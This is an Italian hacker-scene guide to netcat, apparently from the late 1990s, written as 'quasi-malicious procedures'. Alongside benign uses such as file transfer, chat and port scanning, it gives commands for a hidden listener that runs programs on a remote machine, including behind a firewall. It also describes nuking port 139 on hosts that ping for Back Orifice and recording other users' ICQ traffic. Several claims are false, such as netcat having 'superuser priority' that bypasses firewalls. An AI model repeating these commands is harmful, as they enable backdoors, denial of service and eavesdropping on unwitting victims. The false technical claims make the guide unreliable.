@@ -1,0 +1,336 @@
+Guida all'uso di NetCat
+
+
+Procedure quasi-maliziose con netcat ad uso e abuso degli aspiranti
+spippolatori.
+
+By Master the Original.
+
+ogni procedura puo' essere provata direttamente sul
+proprio computer utilizzandolo contemporaneamente come
+client e come server.
+e' sufficiente aprire due form dos ed eseguire all'interno
+le procedure relative.
+L'ip a cui collegarsi in modalita' client ovviamente sara' 
+
+127.0.0.1 = (localhost)
+
+se durante l'esecuzione dei comandi il dial-up cerca di 
+stabilire una connessione : premere annulla nel form
+relativo .. se ci si collega al nostro computer siamo
+gia' collegati anche senza il dial no!? ;-)
+
+
+lista delle opzioni di netcat utilizzate
+
+( nc -h per avere l'help)
+
+-d modo stealth, rende TSR e invisibile netcat
+-e prog.exe esegue il programma prog.exe
+-i secs delay, tempo di ritardo in secondi
+-l modo 'in ascolto' esecuzione unica
+-L modo 'in ascolto' esecuzione ciclica
+-n dichiara che gli IP sono in formato numerico
+-o file salva file relativo al traffico su una porta
+-p port porta numero <port>
+-s addr indirizzo IP a cui collegarsi
+-t emula i protocolli di scambio di TELNET
+-u abilita il protocollo UPD
+-v 'verbose' stampa a schermo tutto quello che fa'
+-vv 'very verbose' come sopra ma piu' approfondito
+-w secs timeout. Dopo <Secs> si disabilita e/o esegue
+-z modo zero-I/O. Usato nello scanning delle porte.
+
+
+NETCAT NELLA PRATICA OPERATIVA
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+NETCAT FUNZIONANTE COME TSR
+
+l'opzione -d (stealth) aggiunta come parametro permette il
+funzionamento di netcat in modo invisibile (nessun form del
+dos viene aperto)
+Questo puo' essere usato sopratutto nella gestione di netcat
+sul computer remoto per non dar la possibilita' di vedere
+l'esecuzione dei comandi.
+Questa opzione non funziona su tutte le macchine, dipende dalle
+locazioni chiamate dalle word tsr init DS:WR, DS:ES che variano
+a seconda delle versioni di w95 e NT.
+Sulle macchine (poche) dove l'opzione crea errore per rendere stealth
+netcat bisogna compilare un prog in c o in basic che trovi 
+l'handler del form dos aperto e lo sposti tramite la API
+MoveWindow in una locazione del desktop non visibile.
+
+es:
+
+KEYLOG DEL CLIENT SUL COMPUTER SERVER
+
+(utile per scrivere un file passo passo sul remoto) 
+
+SERVER
+nc -d -l -p <porta> > c:\windows\sorpresa.txt
+
+CLIENT
+nc <Indirizzo IP del remoto> <porta>
+
+scrivendo del testo e terminando la digitazione
+con CTRL C sul server verra' scritto alla locazione
+designata tutto cio' che e' stato digitato con 
+l'analoga formattazione.
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SPEDIZIONE DI UN FILE AD UN COMPUTER REMOTO
+
+COMPUTER CHE RICEVE
+
+nc -l -p <porta> -v -t -w 3 > prova.txt
+
+le opzioni -v -t non servono all'atto pratico
+sono solo per fare le verifiche.
+-L (elle maiuscola) al posto di -l se si vuole che
+dopo la ricezione netcat si riesegua automaticamente
+con le stesse opzioni. (Esecuzione ciclica)
+
+COMPUTER CHE INVIA
+
+nc <indirizzo IP> <porta> < filedainviare.txt
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+CHAT ANONIMA PERSONALE CON UN ALTRO UTENTE
+
+si aprono due form DOS
+
+PERSONA 1:
+nc -l -p <porta1> -v (ascolta e vede sulla porta 1)
+nc <indirizzo IP di persona 2> <porta2> (manda i caratteri sulla porta 2)
+
+PERSONA 2:
+nc -l -p <porta2> -v (ascolata e vede sulla porta 2)
+nc <indirizzo IP di persona 1> <porta1> (manda i caratteri sulla porta 1)
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ESECUZIONE DI UN PROGRAMMA SU UN COMPUTER REMOTO
+
+COMPUTER REMOTO:
+nc -l -p <porta> -e c:\dir1\dir2\..\formatta.bat
+
+-L (elle maiuscola) al posto di -l se si vuole che
+dopo la ricezione netcat si riesegua automaticamente
+con le stesse opzioni. (Esecuzione ciclica)
+(ovviamente il file formatta.bat va fatto e spedito
+prima!)
+
+ALTRO COMPUTER:
+nc <indirizzo IP del remoto> <porta>
+
+
+
+1. OGNI PROCEDURA PUO' ESSERE ESEGUITA SU PROTOCOLLO UPD
+AGGIUNGENDO -u alle opzioni
+
+2. E' possibile (richiamo precedente) usare l'opzione stealth
+per rendere invisibile l'attesa di chiamata da parte di netcat
+sul computer remoto: le opzioni in questo caso cambiano in
+
+COMPUTER REMOTO 
+nc -d -L -p <porta> -e c:\dir1\dir2\..\programma.exe
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ESECUZIONE DI UNO SCRIPT SU TELNET
+
+ES: SPEDIZIONE DI UNA MAIL SU SMTP
+
+File posta.txt 
+inizio ---------------------------------------
+MAIL FROM : Master <csf0137@polaris.it>
+RCPT TO : qualcuno@qualcuno.qu
+DATA
+Ciao ciao.
+ti mando questa mail tramite netcat!
+.
+fine ---------------------------------------
+
+nc <indirizzo IP dell'SMTP> 25 < posta.txt
+
+ES: SPEDIZIONE DI ARTICOLO SU ALT.HACKERS
+
+File articolo.txt
+inizio ----------------------------------------
+group alt.hackers
+listgroup alt.hackers 
+post
+From: Master <csf0137@polaris.it>
+Newsgroups: alt.hacker
+Subject: Post con netcat
+Approved: approvato!
+X-Newsreader: NETCAT PROFESSIONAL ;-)
+
+questo articolino viene spedito
+tramite netcat.
+.
+fine ----------------------------------------
+
+nc <indirizzo IP del news server> 119 < articolo.txt
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+VERIFICA DELLE INTROMISSIONI SU UNA PORTA
+CON VISIONE DELL'IP DI COLLEGAMENTO E CARATTERI
+RICEVUTI
+
+ES: PING DA PARTE DI UTENTI BACKORIFICE!
+
+
+nc -l -v -u -p 31337
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+CATALOGO DEGLI USER CHE PINGANO SULLA 31337 UPD
+
+
+nc -l -v -u -p 31337 >> catalogo.txt
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+VERIFICA E SPEDIZIONE DI TESTO IN CASO DI PING (a altro)
+
+nc -l -v -u -p 31337 > trovaip.cmd
+nc -n -s <ip trovato> -p 139 < nuke.txt
+
+ci vuole un piccolo script in c per passare
+l'IP dal file trovaip.cmd a <ip trovato>
+(usare per danneggiare il sistema caratteri
+preceduti dal carattere ^ = CTRL ... ^Z=invio)
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+NETCAT >>> E' <<< UGUALE A TELNET
+
+invece di TELENT indirizzo porta
+
+basta dire NC indirizzo porta
+
+con la differenza che mentre telnet usa esclusivamente il
+protocollo TCP netcat spedisce e riceve anche su UPD settando
+il parametro -u.
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SUPERSNIFFER
+-SALVA UN FILE CONTENENTE IL TRAFFICO ASCII PASSANTE PER UNA PORTA
+
+es. collegandosi alla porta chat di uno che conversa in ICQ
+si registra tutto quello che invia. ;-)
+
+SUL PROPRIO COMPUTER
+
+nc -l -p <porta> -o c:\dir\..\leggotutto.txt
+
+poi per fare la prova ci si puo collegare su un altro
+form dos con 
+nc 127.0.0.1 <porta> 
+e provare a digitare qualcosa seguito da CTRL C per
+leggere poi il traffico ASCI nel file leggotutto.txt
+dovrebbe essere un qualcosa del tipo
+file leggotutto.txt ---------------------------------
+< 00000000 61 73 64 95 61 73 64 0a # asd.asd.
+< 00000008 61 73 64 0a # asd.
+< 0000000c 73 73 0a # ss.
+< 0000000f 73 0a # s.
+< 00000011 73 0a # s.
+< 00000013 0a # .
+< 00000014 73 0a # s. 
+< 00000016 73 64 61 61 73 64 0a # sdaasd.
+fine -----------------------------------------------
+
+SUL COMPUTER REMOTO
+
+nc -l -p <porta> -s <nome host remoto> -o c:\dir\..\leggo.txt
+
+oppure se si conosce l'ip in forma numerica
+
+nc -l -p <porta> -n -s <indirizzo IP> -o c:\dir\..\leggo.txt
+
+si legge il traffico ascii sulla porta <porta> del computer 
+remoto e ovviamente viene registrato il tutto sul proprio
+computer nel file leggo.txt
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SNIFFER - SCANNER
+
+TROVARE UNA PORTA APERTA SUL COMPUTER REMOTO
+
+nc <indirizzo IP> <port1>-<port2> -v
+
+es: nc 123.456.789.012 1000-2000 -v
+
+[ con porta1-porta2 si dichiara un 
+range di porte da scannerare ] 
+
+nc va alla ricerca di una porta rispondente dalla 1000
+alla 2000 sul computer remoto. E' MOLTO LENTO!!!
+per abbreviare i tempi a scapito della precisone
+si puo' usare l'opzione -z
+
+nc 123.456.789.012 1000-2000 -v -z
+
+per fare la prova si apre in un form dos nc con le seguenti opzioni
+
+nc -l -v -p 1234 ( apre la porta 1234 e si mette in ascolto)
+
+in un altro form dos si esegue
+
+nc 127.0.0.1 1230-1240
+
+dopo un po' nc stampera' le informazioni trovate relativamente
+alla porta aperta.
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+PRIORITA' (questo c'e' anche sulla guida!)
+
+Netcat si assegna di default una priorita' di connessione di livello
+admin superuser percui l'esecuzione dei comandi e delle varie opzioni
+viene eseguita al di sopra di ogni altro protocollo.
+
+
+es: eseguendo un comando parallelamente ad una sessione netbios o
+anche sotto firewall si oltrepassa la priorita' di queti ultimi
+permettendo l'aggiramento di ogni tipo di protezione.
+
+es. netbios
+
+nc -v -l -p 139 -n -s <indirizzo IP sorgente> > leggo.txt
+legge i dati sulla porta 139 di un macchina in remoto
+collegandosi all'IP sorgente.
+Se il remoto effettua delle transazioni su quest'ultima
+netcat mette il netbios in attesa e finisce prima il proprio
+lavoro (spesso macchine NT vanno in crash.)
+
+.. si potra' anche inviare sulla 139 dei dati? mah! ;-)))
+
+es. firewall 
+
+di solito i firewall permettono la lettura sulle porte
+53 e/o 59 e/o 20 .. questo almeno per l'invio dei dati
+relativi alle dichiarazioni di 'avvertimento'.. questo basta!
+
+sulla macchina sotto firewall volendo ad esempio far partire
+il programma crash.exe in diverse riprese si installa 
+netcat nel seguente modo:
+
+nc -d -L -p <porta del firewall aperta> -e c:\dir\..\crash.exe
+
+sulla propria invece
+
+nc -v <ip della macchina firewallata> -p <porta del firewall aperta>
+
+(-v e' giusto per vedere che cosa dice!)
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+... il resto e il meglio alla prossima puntata!!! ha ha ha.
